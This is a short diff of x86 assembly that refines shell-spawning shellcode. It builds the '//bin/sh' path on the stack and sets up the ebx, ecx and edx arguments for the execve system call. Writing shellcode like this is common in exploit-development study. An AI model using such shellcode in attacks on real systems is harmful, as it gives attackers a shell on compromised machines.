@@ -10,7 +10,13 @@ _start:
   push 0x69622f2f ;//bi
 
   ; Get the pointer to ebx
-  mov ebx, esp
+  mov ebx, esp ; First parameter
+
+  ; Empty and set third and second parameter
+  push eax
+  mov edx, esp
+  push eax
+  mov ecx, esp
 
   ; sys_execve
   mov al, 0x0b
